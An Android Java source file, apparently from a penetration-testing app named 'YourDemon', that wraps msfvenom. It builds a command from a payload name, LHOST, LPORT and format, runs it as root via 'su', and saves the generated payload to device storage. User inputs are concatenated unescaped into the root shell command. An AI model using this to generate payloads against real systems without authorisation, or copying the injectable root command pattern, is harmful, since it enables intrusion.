package com.opx.yourdemon.payload_generator.utils;


import android.util.Log;

import com.opx.yourdemon.utils.Core;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.util.ArrayList;

public class PayloadRunner {

    public static ArrayList<String> execute(String payload, String lhost, String lport, String format, String filename, Core core) {
        String exec = Core.EXECUTE;
        String line;
        ArrayList<String> result = new ArrayList<>();

        try {
            String cmd = exec + "'msfvenom -p " + payload + " LHOST=" + lhost + " LPORT=" + lport + " -f " + format + " -o /storage/emulated/0/YourDemon/" + filename + "." + format + "'";
            core.writelinetolog(cmd);
            Process process = Runtime.getRuntime().exec("su");
            OutputStream stdin = process.getOutputStream();
            InputStream stderr = process.getErrorStream();
            InputStream stdout = process.getInputStream();
            stdin.write((cmd + '\n').getBytes());
            stdin.flush();
            stdin.close();
            ArrayList<String> out = new ArrayList<>();
            ArrayList<String> outerror = new ArrayList<>();
            BufferedReader br = new BufferedReader(new InputStreamReader(stdout));
            while ((line = br.readLine()) != null) {
                out.add(line);
            }
            br.close();
            br = new BufferedReader(new InputStreamReader(stderr));
            while ((line = br.readLine()) != null) {
                outerror.add(line);
            }
            br.close();

            process.waitFor();
            process.destroy();
            result = out;
        } catch (IOException e) {
            Log.d("PayloadRunner", "An IOException was caught: " + e.getMessage());
        } catch (InterruptedException ex) {
            Log.d("PayloadRunner", "An InterruptedException was caught: " + ex.getMessage());
        }

        return result;
    }
}

